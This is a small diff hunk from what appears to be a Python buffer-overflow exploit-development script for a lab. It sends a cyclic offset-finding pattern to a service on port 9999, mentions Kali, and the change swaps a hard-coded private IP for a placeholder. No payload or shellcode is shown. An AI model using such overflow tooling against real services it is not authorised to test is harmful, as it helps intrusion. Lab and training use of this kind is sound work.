@@ -7,7 +7,7 @@ pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.settimeout(10)
 
-sock.connect(("10.224.79.119", 9999))  # change this if connecting from kali
+sock.connect(("<IP>", 9999))  # change this if connecting from kali
 print("[+] Connection made")
 
 banner = sock.recv(1024)
